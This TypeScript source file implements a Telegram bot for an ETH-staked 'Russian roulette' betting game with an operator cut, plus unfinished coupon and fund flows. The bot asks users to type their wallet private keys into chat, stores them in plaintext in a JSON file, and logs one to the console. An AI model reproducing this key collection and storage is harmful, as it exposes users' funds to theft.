import "dotenv/config";
import TelegramBot, { CallbackQuery, Message } from "node-telegram-bot-api";
import express, { query } from "express";
import cors from "cors";
import { Wallet, ethers } from "ethers";
import { Calendar } from "@michpl/telegram-calendar";

import {
  AskEstablish,
  BuyCard,
  BuyInfo,
  FundInfoSetting,
  MainCard,
  MainLineKey,
  UpdateWallet,
} from "./Inline";
import {
  CuponControlInfo,
  CuponIds,
  EstablishInfo,
  FundInfo,
  StateInfo,
  UserInfo,
  WalletInfo,
} from "./utils";
import { ValidateWalletPrivateKey, playerValidation } from "./validate";
import {
  emptyCylinder,
  fetchDataFromJSONFile,
  getFirstPlayer,
  getPrize,
  initialChamber,
  passToNext,
  payForD2R,
  payForJoin,
  payForMe,
  payForWinner,
  pullTrigger,
  removeLoser,
  spinCylinder,
  storeDataInJSONFile,
} from "./action";

const calendar = new Calendar();

const app = express();
const port = process.env.PORT || 3020;

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.listen(port, () => {
  console.log(`Express started on http://localhost:${port}`);
});

const botToken = process.env.TG_TOKEN;
const buyChannel = process.env.BUY_CHANNEL;
const mainChannel = process.env.FUND_CHANNEL;
const address = process.env.ADDRESS;

const ControlInfo: { [key: number]: CuponControlInfo } = {};
const MessageStateInfo: { [key: number]: StateInfo } = {};
const UserWalletInfo: { [key: number]: WalletInfo } = {};
const UserEstablishInfo: { [key: number]: EstablishInfo } = {};
const UserFundInfo: { [key: number]: FundInfo } = {};
const UserCuponIds: { [key: number]: CuponIds } = {};

const bot = new TelegramBot(botToken!, {
  polling: true,
});

const provider = new ethers.JsonRpcProvider("https://rpc.ankr.com/eth_goerli/");

let getUser: any;
let channelId: any;
let players: any;
let cost: number;
let losers: number;

let player: string[] = [];
let isPullTrigger = true;
let isPass = true;
let isSpin = true;
const chambers: boolean[] = [];
let currentChamberIndex = 0;
let turn = 0;
let count = 0;
// const gameButtons = [
//   [
// { text: "Pull Trigger", callback_data: "shot" },
// { text: "Pass", callback_data: "pass" },
// { text: "Spin Chamber", callback_data: "spin" },
//   ],
// ];
app.post("/fund", (req, res) => {
  try {
    bot.sendMessage(
      buyChannel!,
      `${BuyCard(
        453463,
        "TESTCUPON",
        "10",
        "0x6322345362345",
        "0.02",
        new Date("2023-10-21")
      )}`,
      {
        parse_mode: "Markdown",
      }
    );
  } catch (error) {}
});

app.post("/post", (req, res) => {
  try {
    bot.sendMessage(mainChannel!, `${MainCard()}`, {
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: MainLineKey() },
    });
  } catch (error) {}
});

bot.onText(/\/createinvitelink/, (msg) => {
  const chatId = msg.chat.id;
  bot.exportChatInviteLink(chatId).then((inviteLink) => {
    bot.sendMessage(
      chatId,
      `Here's the invite link to the group: ${inviteLink}`
    );
  });
});

bot.onText(/\/start/, async (msg: Message) => {
  try {
    const chatId = msg.chat.id;

    const botType = msg.text?.split(" ")[1].split("_")[0];

    if (botType === "buy") {
      const [type, cupon_id] = msg.text!.split(" ")[1].split("_");

      ControlInfo[chatId] = {
        type: type,
        cupon_id: cupon_id,
      };
    } else if (botType === "mint") {
      ControlInfo[chatId] = { type: "mint" };
    } else if (botType === "establish") {
      ControlInfo[chatId] = { type: "establish" };
    } else if (botType === "fund") {
      ControlInfo[chatId] = { type: "fund" };
    }

    const sentMsg = await bot.sendMessage(
      msg.chat.id,
      "Welcome! Click the buttons below for wallet connection.",
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "Wallet", callback_data: `setup_wallet` }],
          ],
        },
      }
    );

    MessageStateInfo[chatId] = {
      state: "",
      deleteMessageNumber: sentMsg.message_id,
    };
  } catch (error) {}
});

bot.on("message", async (msg: Message) => {
  const chatId = msg.chat.id;
  const messageId = msg.message_id;
  let sentMsg;
  // const groupId = msg.

  // const turn = getFirstPlayer(parseInt(msg.text!));
  // console.log("turn", turn);

  if (msg.text?.includes("/welcome")) {
    channelId = msg.chat.username;
    bot.sendMessage(chatId, "setup wallet", {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Wallet",
              url: "https://t.me/gotgru_bot?start=establish",
            },
          ],
        ],
      },
    });
    // removeMessage(chatId, msg.message_id);
  }
  if (msg.text && msg.text?.includes(`@gotgru_bot`)) {
    // Your logic here for responding when the bot is mentioned
    bot.sendMessage(chatId, `${MainCard()}`, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Wallet", callback_data: `setup_wallet` }]],
      },
    });
  }
  if (msg.text?.includes("/revolver")) {
    emptyCylinder(chambers);
    const userData = fetchDataFromJSONFile(msg.from?.id!);
    if (userData?.userId === msg.from?.id) {
      player = [];
      player.push("@" + msg.from?.username!);
      players = parseInt(msg.text.split(" ")[1]);
      cost = parseInt(msg.text.split(" ")[2]);
      losers = parseInt(msg.text.split(" ")[3]);
      bot.sendMessage(
        chatId,
        `@${msg.from?.username} new create game!\n🎮 Created Game!\n🤹‍♂️ Players: ${players}\n🤑 Cost: $${cost}\n😞 Losers: ${losers}\n Joined Player: ${player}`,
        {
          reply_markup: {
            inline_keyboard: [[{ text: "Join", callback_data: `join_game` }]],
          },
        }
      );
    } else {
      channelId = msg.chat.username;
      bot.sendMessage(chatId, "setup wallet", {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "Wallet",
                url: "https://t.me/gotgru_bot?start=establish",
              },
            ],
          ],
        },
      });
    }
  }
});

bot.on("callback_query", async (query: CallbackQuery) => {
  const chatId = query.message?.chat.id;
  const messageId = query.message?.message_id;

  const [action] = query.data!.split(" ");
  const username = query.from.username;
  const userId = query.from.id;
  let sentMsg;
  const userData = fetchDataFromJSONFile(userId);

  switch (action) {
    case "setup_wallet":
      // Set private key of user wallet
      // removeMessage(chatId!, query.message?.message_id!);
      bot.sendMessage(chatId!, "Please, Input your wallet private key!");
      break;
    case "join_game":
      // console.log("play,", isPlayer);
      if (username) {
        const isPlayer = playerValidation(username!, player);
        if (!isPlayer) {
          bot.sendMessage(chatId!, `@${username}! You already Joined!`);
        } else {
          const pay = payForJoin(userData?.privateKey!, address, cost);
          if (!pay) {
            bot.sendMessage(
              chatId!,
              `@${username}! You can't join game, because not enough ETH. Please charge ETH in your Wallet`
            );
          } else {
            player.push(`@${username}`);
            if (player.length <= players) {
              bot.editMessageText(
                `${player[0]}'s Game\n 🎮 Created Game!\n🤹‍♂️ Players: ${players}\n🤑 Cost: $${cost}\n😞 Losers: ${losers}\n Joined Player: ${player}`,
                {
                  chat_id: chatId,
                  message_id: messageId,
                  reply_markup: {
                    inline_keyboard: [
                      [{ text: "Join", callback_data: `join_game` }],
                    ],
                  },
                }
              );
              if (player.length === players) {
                bot.editMessageText(
                  `${player[0]}'s Game\n 🎮 Created Game!\n🤹‍♂️ Players: ${players}\n🤑 Cost: $${cost}\n😞 Losers: ${losers}\n Joined Player: ${player}\n All players already joined`,
                  {
                    chat_id: chatId,
                    message_id: messageId,
                  }
                );
                turn = getFirstPlayer(players);
                const isBullet = initialChamber(chambers);
                if (isBullet) {
                  bot.sendDocument(
                    chatId!,
                    "https://media.tenor.com/WBnU-Ltt26UAAAAM/it-starts-now-bebe-rexha.gif",
                    {
                      caption: `Playing Game\n Bullet was placed\n🤹‍♂️ Players: ${players}\n🤑 Cost: $${cost}\n ${
                        player[turn - 1]
                      }! Your turn`,
                      reply_markup: {
                        inline_keyboard: [
                          [
                            { text: "Pull Trigger", callback_data: "shot" },
                            { text: "Pass", callback_data: "pass" },
                            { text: "Spin Chamber", callback_data: "spin" },
                          ],
                        ],
                      },
                    }
                  );
                } else {
                  bot.sendDocument(
                    chatId!,
                    "https://media.tenor.com/WBnU-Ltt26UAAAAM/it-starts-now-bebe-rexha.gif",

                    {
                      caption: `Playing Game\n Bullet is in Cylinder already \n🤹‍♂️ Players: ${players}\n🤑 Cost: $${cost}\n ${
                        player[turn - 1]
                      }! Your turn`,
                      reply_markup: {
                        inline_keyboard: [
                          [
                            { text: "Pull Trigger", callback_data: "shot" },
                            { text: "Pass", callback_data: "pass" },
                            { text: "Spin Chamber", callback_data: "spin" },
                          ],
                        ],
                      },
                    }
                  );
                }
              }
            }
          }
        }
      }
      break;
    case "shot":
      const nPlayer = passToNext(turn, players);
      const fired = pullTrigger(chambers, currentChamberIndex);
      currentChamberIndex = fired.currentChamberIndex;
      // const replyMarkup: any = {
      //   inline_keyboard: [[{ text: "Pull Trigger", callback_data: "shot" }]],
      // };

      // if (isSpin) {
      //   replyMarkup.inline_keyboard.push({
      //     text: "Spin Chamber",
      //     callback_data: "spin",
      //   });
      // } else {
      //   replyMarkup.inline_keyboard.push({
      //     text: "Pass",
      //     callback_data: "pass",
      //   });
      // }

      // if (isPass) {
      //   replyMarkup.inline_keyboard.push({
      //     text: "Pass",
      //     callback_data: "pass",
      //   });
      // } else {
      //   replyMarkup.inline_keyboard.push({
      //     text: "Spin Chamber",
      //     callback_data: "spin",
      //   });
      // }

      if (fired.bulletFired) {
        if (isSpin && isPass) {
          bot.sendDocument(
            chatId!,
            "https://tenor.com/view/dead-x_x-dies-gif-24040993",
            {
              caption: `Playing Game\n \n🤹‍♂️ Players: ${players}\n🤑 Cost: $${cost}\n ${
                player[turn - 1]
              } You died💀\n ${player[nPlayer - 1]}! Your turn`,
              reply_markup: {
                inline_keyboard: [
                  [
                    { text: "Pull Trigger", callback_data: "shot" },
                    { text: "Pass", callback_data: "pass" },
                    { text: "Spin Chamber", callback_data: "spin" },
                  ],
                ],
              },
            }
          );
        } else if (!isSpin) {
          bot.sendDocument(
            chatId!,
            "https://tenor.com/view/dead-x_x-dies-gif-24040993",
            {
              caption: `Playing Game\n \n🤹‍♂️ Players: ${players}\n🤑 Cost: $${cost}\n ${
                player[turn - 1]
              } You died💀\n ${player[nPlayer - 1]}! Your turn`,
              reply_markup: {
                inline_keyboard: [
                  [
                    { text: "Pull Trigger", callback_data: "shot" },
                    { text: "Pass", callback_data: "pass" },
                  ],
                ],
              },
            }
          );
        } else if (!isPass) {
          bot.sendDocument(
            chatId!,
            "https://tenor.com/view/dead-x_x-dies-gif-24040993",
            {
              caption: `Playing Game\n \n🤹‍♂️ Players: ${players}\n🤑 Cost: $${cost}\n ${
                player[turn - 1]
              } You died💀\n ${player[nPlayer - 1]}! Your turn`,
              reply_markup: {
                inline_keyboard: [
                  [
                    { text: "Pull Trigger", callback_data: "shot" },
                    { text: "Spin Chamber", callback_data: "spin" },
                  ],
                ],
              },
            }
          );
        }
        if (!isPass && !isSpin) {
          bot.sendDocument(
            chatId!,
            "https://tenor.com/view/dead-x_x-dies-gif-24040993",
            {
              caption: `Playing Game\n \n🤹‍♂️ Players: ${players}\n🤑 Cost: $${cost}\n ${
                player[turn - 1]
              } You died💀\n ${player[nPlayer - 1]}! Your turn`,
              reply_markup: {
                inline_keyboard: [
                  [{ text: "Pull Trigger", callback_data: "shot" }],
                ],
              },
            }
          );
        }

        count++;
        player = removeLoser(player[turn - 1], player);
        if (losers === count) {
          const reward = getPrize(cost, players - losers);
          const paid = payForWinner(player, reward.prize);
          payForMe(reward.mine);
          payForD2R(reward.toVault);
          bot.sendDocument(
            chatId!,
            "https://media.tenor.com/7EHHRFTVMYcAAAAM/congrats-congratulation.gif",
            {
              caption: `Game Finished\n 🎊🎊Congratulation🎉🎉 \n🤹‍♂️ Winners: ${player}\n🤑 Prize: Each player get $${reward.prize}\n`,
            }
          );
          count = 0;
          emptyCylinder(chambers);
          isSpin = true;
          isPass = true;
        }
      } else {
        console.log("shot", isSpin, isPass);
        if (isSpin && isPass) {
          console.log("all");
          bot.sendDocument(
            chatId!,
            "https://media.tenor.com/FnRpM31R4KQAAAAj/i-exist-steve-terreberry.gif",
            {
              caption: `Playing Game\n \n🤹‍♂️ Players: ${players}\n🤑 Cost: $${cost}\n ${
                player[turn - 1]
              } You are alive 😓\n ${player[nPlayer - 1]}! Your turn`,
              reply_markup: {
                inline_keyboard: [
                  [
                    { text: "Pull Trigger", callback_data: "shot" },
                    { text: "Pass", callback_data: "pass" },
                    { text: "Spin Chamber", callback_data: "spin" },
                  ],
                ],
              },
            }
          );
        } else if (!isSpin) {
          console.log("spin");

          bot.sendDocument(
            chatId!,
            "https://media.tenor.com/FnRpM31R4KQAAAAj/i-exist-steve-terreberry.gif",
            {
              caption: `Playing Game\n \n🤹‍♂️ Players: ${players}\n🤑 Cost: $${cost}\n ${
                player[turn - 1]
              } You are alive 😓\n ${player[nPlayer - 1]}! Your turn`,
              reply_markup: {
                inline_keyboard: [
                  [
                    { text: "Pull Trigger", callback_data: "shot" },
                    { text: "Pass", callback_data: "pass" },
                  ],
                ],
              },
            }
          );
        } else if (!isPass) {
          console.log("pass");

          bot.sendDocument(
            chatId!,
            "https://media.tenor.com/FnRpM31R4KQAAAAj/i-exist-steve-terreberry.gif",
            {
              caption: `Playing Game\n \n🤹‍♂️ Players: ${players}\n🤑 Cost: $${cost}\n ${
                player[turn - 1]
              } You are alive 😓\n ${player[nPlayer - 1]}! Your turn`,
              reply_markup: {
                inline_keyboard: [
                  [
                    { text: "Pull Trigger", callback_data: "shot" },
                    { text: "Spin Chamber", callback_data: "spin" },
                  ],
                ],
              },
            }
          );
        }
        if (!isPass && !isSpin) {
          console.log("all----");

          bot.sendDocument(
            chatId!,
            "https://media.tenor.com/FnRpM31R4KQAAAAj/i-exist-steve-terreberry.gif",
            {
              caption: `Playing Game\n \n🤹‍♂️ Players: ${players}\n🤑 Cost: $${cost}\n ${
                player[turn - 1]
              } You are alive 😓\n ${player[nPlayer - 1]}! Your turn`,
              reply_markup: {
                inline_keyboard: [
                  [{ text: "Pull Trigger", callback_data: "shot" }],
                ],
              },
            }
          );
        }
      }
      turn = passToNext(turn, players);
      break;
    case "pass":
      const pass = passToNext(turn, players);

      if (!isSpin) {
        bot.sendDocument(
          chatId!,
          "https://media.tenor.com/PKMDQ8BwSWkAAAAM/thanks-thanku.gif",
          {
            caption: `Playing Game\n \n🤹‍♂️ Players: ${players}\n🤑 Cost: $${cost}\n ${
              player[turn - 1]
            } You pass to Next\n ${player[pass - 1]}! Your turn`,
            reply_markup: {
              inline_keyboard: [
                [{ text: "Pull Trigger", callback_data: "shot" }],
              ],
            },
          }
        );
      } else {
        bot.sendDocument(
          chatId!,
          "https://media.tenor.com/PKMDQ8BwSWkAAAAM/thanks-thanku.gif",
          {
            caption: `Playing Game\n \n🤹‍♂️ Players: ${players}\n🤑 Cost: $${cost}\n ${
              player[turn - 1]
            } You pass to Next\n ${player[pass - 1]}! Your turn`,
            reply_markup: {
              inline_keyboard: [
                [
                  { text: "Pull Trigger", callback_data: "shot" },
                  { text: "Spin Chamber", callback_data: "spin" },
                ],
              ],
            },
          }
        );
      }
      turn = passToNext(turn, players);
      isPass = false;
      break;
    case "spin":
      const next = passToNext(turn, players);
      currentChamberIndex = spinCylinder(chambers);

      if (!isPass) {
        bot.sendDocument(
          chatId!,
          "https://tenor.com/view/russian-roulette-gun-gif-24197229",
          {
            caption: `Playing Game\n \n🤹‍♂️ Players: ${players}\n🤑 Cost: $${cost}\n ${
              player[turn - 1]
            } You wildly spin the cylinder \n ${player[next - 1]}! Your turn`,
            reply_markup: {
              inline_keyboard: [
                [{ text: "Pull Trigger", callback_data: "shot" }],
              ],
            },
          }
        );
      } else {
        bot.sendDocument(
          chatId!,
          "https://tenor.com/view/russian-roulette-gun-gif-24197229",
          {
            caption: `Playing Game\n \n🤹‍♂️ Players: ${players}\n🤑 Cost: $${cost}\n ${
              player[turn - 1]
            } You wildly spin the cylinder \n ${player[next - 1]}! Your turn`,
            reply_markup: {
              inline_keyboard: [
                [
                  { text: "Pull Trigger", callback_data: "shot" },
                  { text: "Pass", callback_data: "pass" },
                ],
              ],
            },
          }
        );
      }

      turn = passToNext(turn, players);
      isSpin = false;
      break;
    case "mint_cupon":
      // Mint cupon using cupon ID
      // After check the cupon was minted.
      if (true) {
        sentMsg = await bot.sendMessage(
          chatId!,
          "Would you like establish this token?",
          { reply_markup: { inline_keyboard: AskEstablish() } }
        );

        MessageStateInfo[chatId!] = {
          state: "",
          deleteMessageNumber: sentMsg.message_id,
        };
      }
      break;

    case "establish_fund":
      //Establis fund
      // Get this cupon Id & set
      UserEstablishInfo[chatId!] = { id: 234 };

      sentMsg = await bot.sendMessage(chatId!, "Please input address.");

      MessageStateInfo[chatId!] = {
        state: "awaiting_establish_address",
        deleteMessageNumber: sentMsg.message_id,
      };
      break;

    case "no_establish":
      sentMsg = await bot.sendMessage(chatId!, "Congratulation mint token.");

      MessageStateInfo[chatId!] = {
        state: "",
        deleteMessageNumber: sentMsg.message_id,
      };
      break;

    case "cupon_name":
      removeMessage(chatId!, query.message?.message_id!);
      sentMsg = await bot.sendMessage(chatId!, "Please input cupon name");

      MessageStateInfo[chatId!] = {
        state: "awaiting_cupon_name",
        deleteMessageNumber: sentMsg.message_id,
      };
      break;

    case "bonus_amount":
      removeMessage(chatId!, query.message?.message_id!);
      sentMsg = await bot.sendMessage(chatId!, "Please input bonus percentage");

      MessageStateInfo[chatId!] = {
        state: "awaiting_bonus_percentage",
        deleteMessageNumber: sentMsg.message_id,
      };
      break;

    case "contract_address":
      removeMessage(chatId!, query.message?.message_id!);
      sentMsg = await bot.sendMessage(
        chatId!,
        "Add the contract address of the token you would like to create a bonus for!"
      );

      MessageStateInfo[chatId!] = {
        state: "awaiting_contract_address",
        deleteMessageNumber: sentMsg.message_id,
      };
      break;

    case "starting_reward":
      removeMessage(chatId!, query.message?.message_id!);
      sentMsg = await bot.sendMessage(chatId!, "Please input starting reward");

      MessageStateInfo[chatId!] = {
        state: "awaiting_starting_reward",
        deleteMessageNumber: sentMsg.message_id,
      };
      break;

    case "vesting_time":
      removeMessage(chatId!, query.message?.message_id!);
      UserFundInfo[chatId!].vest = new Date();

      sentMsg = await bot.sendMessage(chatId!, "Please enter date.", {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: calendar.getPage(new Date()),
        },
      });
      break;

    case "eth_reward":
      removeMessage(chatId!, query.message?.message_id!);
      if (!UserFundInfo[chatId!].token_type) {
        UserFundInfo[chatId!].token_type = true;
      } else {
        UserFundInfo[chatId!].token_type = false;
      }
      BackFundControl(chatId!);
      break;

    case "fund":
      try {
        bot.sendMessage(
          buyChannel!,
          `${BuyCard(
            UserFundInfo[chatId!].id,
            UserFundInfo[chatId!].cupon_name!,
            UserFundInfo[chatId!].bonus!,
            UserFundInfo[chatId!].address!,
            UserFundInfo[chatId!].reward!,
            UserFundInfo[chatId!].vest!
          )}`,
          {
            parse_mode: "Markdown",
          }
        );
      } catch (error) {}
      break;

    case "no_update":
      removeMessage(chatId!, query.message?.message_id!);

      SelectWay(chatId!);
      break;

    case "wallet_update":
      removeMessage(chatId!, query.message?.message_id!);

      sentMsg = await bot.sendMessage(chatId!, "Plase input your update key.");

      MessageStateInfo[chatId!] = {
        state: "awaiting_wallet_address",
        deleteMessageNumber: sentMsg.message_id,
      };
      break;

    default:
      try {
        const { date, action } = JSON.parse(query.data!);

        if ((date === 0 && action === null) || action === "select-year") return;

        const currentDate = new Date(UserFundInfo[chatId!].vest!);

        if (action === "next-month") {
          currentDate.setMonth(currentDate.getMonth() + 1);

          sentMsg = await bot.sendMessage(chatId!, "Please enter date.", {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: calendar.getPage(currentDate),
            },
          });

          MessageStateInfo[chatId!] = {
            state: "",
            deleteMessageNumber: sentMsg.message_id,
          };
        } else if (action === "prev-month") {
          currentDate.setMonth(currentDate.getMonth() - 1);
          sentMsg = await bot.sendMessage(chatId!, "Please enter date.", {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: calendar.getPage(currentDate),
            },
          });

          MessageStateInfo[chatId!] = {
            state: "",
            deleteMessageNumber: sentMsg.message_id,
          };
        } else {
          UserFundInfo[chatId!].vest = date;
          BackFundControl(chatId!);
        }
      } catch (error) {}

      break;
  }
});

bot.on("message", async (msg: Message) => {
  const chatId = msg.chat.id;
  const userId = msg.chat.username;
  const check = ValidateWalletPrivateKey(msg.text!);

  if (userId === msg.from?.username) {
    if (check) {
      const wallet = new Wallet(msg.text!);
      console.log("wallet", wallet);
      if (wallet) {
        const userData = fetchDataFromJSONFile(msg.from?.id!);
        bot.deleteMessage(chatId, msg.message_id);
        if (userData?.userId === msg.from?.id!) {
          bot.sendMessage(chatId, "Already registered User!", {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [
                  {
                    text: "Go Back",
                    url: `https://t.me/${channelId}?start=establish`,
                  },
                ],
              ],
            },
          });
        } else {
          const data: UserInfo = {
            userId: msg.from?.id!,
            userName: msg.from?.username!,
            privateKey: msg.text!,
            wallet: wallet,
          };
          storeDataInJSONFile(data);
          // bot.deleteMessage(chatId, msg.message_id);
          bot.sendMessage(chatId, "Success", {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [
                  {
                    text: "Go Back",
                    url: `https://t.me/${channelId}?start=establish`,
                  },
                ],
              ],
            },
          });
        }
      }
    } else {
      bot.sendMessage(chatId, "Please input correct Private key");
    }
  }

  // if (key?.length === 64) {
  //   const wallet = new Wallet(msg.text!);
  //   console.log("wallet", wallet);
  //   if (wallet) {
  //     bot.deleteMessage(chatId, msg.message_id);
  //     bot.sendMessage(chatId, "Success");
  //   }
  // } else {
  //   bot.sendMessage(chatId, "Please input correct Private key");
  // }
});

const BackFundControl = async (chatId: number) => {
  const sentMsg = await bot.sendMessage(
    chatId,
    `Please input fund token info.\n\nCupon ID: #${
      UserFundInfo[chatId].id ? UserFundInfo[chatId].id : ""
    }\nCupon Name: ${
      UserFundInfo[chatId].cupon_name ? UserFundInfo[chatId].cupon_name : ""
    }\nBonus Percentage: ${
      UserFundInfo[chatId].bonus ? UserFundInfo[chatId].bonus : ""
    }\nContract Address: ${
      UserFundInfo[chatId].address ? UserFundInfo[chatId].address : ""
    }\nStarting Reward: ${
      UserFundInfo[chatId].reward ? UserFundInfo[chatId].reward : ""
    }\nVesting Time: ${
      UserFundInfo[chatId].vest ? UserFundInfo[chatId].vest : ""
    }\nETH reward: ${UserFundInfo[chatId].token_type ? "ETH" : "TOKEN"}`,
    {
      reply_markup: { inline_keyboard: FundInfoSetting() },
    }
  );

  MessageStateInfo[chatId!] = {
    state: "",
    deleteMessageNumber: sentMsg.message_id,
  };
};

const SelectWay = async (chatId: number) => {
  let sentMsg;

  if (ControlInfo[chatId].type === "buy") {
    sentMsg = await bot.sendMessage(chatId, "Please input amount of ETH");

    MessageStateInfo[chatId!] = {
      state: "awaiting_eth_amount",
      deleteMessageNumber: sentMsg.message_id,
    };
  } else if (ControlInfo[chatId].type === "mint") {
    sentMsg = await bot.sendMessage(chatId, `Info of Mint\n\n`, {
      reply_markup: {
        inline_keyboard: [[{ text: "Mint", callback_data: "mint_cupon" }]],
      },
    });

    MessageStateInfo[chatId!] = {
      state: "",
      deleteMessageNumber: sentMsg.message_id,
    };
  } else if (ControlInfo[chatId].type === "establish") {
    // Find cupons using his wallet private key
    UserCuponIds[chatId] = { ids: ["123", "523", "1235", "5234"] };
    const cuponText = UserCuponIds[chatId].ids.join(", ");

    sentMsg = await bot.sendMessage(
      chatId!,
      `Here is your cupons.\n\n${cuponText}\n\nPlease input Cupon Id`
    );

    MessageStateInfo[chatId!] = {
      state: "awaiting_establish_cupon_id",
      deleteMessageNumber: sentMsg.message_id,
    };
  } else if (ControlInfo[chatId].type === "fund") {
    // Find fund token using UserWalletInfo[ahtId].wallet_public
    UserCuponIds[chatId] = { ids: ["12343", "23", "125", "523424"] };
    const cuponText = UserCuponIds[chatId].ids.join(", ");

    sentMsg = await bot.sendMessage(
      chatId!,
      `Here is your cupons.\n\n${cuponText}\n\nPlease input Cupon Id`
    );

    MessageStateInfo[chatId!] = {
      state: "awaiting_fund_cupon_id",
      deleteMessageNumber: sentMsg.message_id,
    };
  }
};

const removeMessage = (chatId: number, msgId: number) => {
  bot.deleteMessage(chatId, msgId);
};

const createCoupon = async (privateKey: string) => {
  try {
    const wallet = new ethers.Wallet(privateKey, provider);
    // const contractWithSigner: any = contract.connect(wallet);
    console.log("------------->", privateKey);
    // const buyCupon = await contractWithSigner.mintCoupon();

    console.log("buy---->>", wallet);
    return "success";
  } catch (error) {
    console.log("error Ether", error);
  }
};
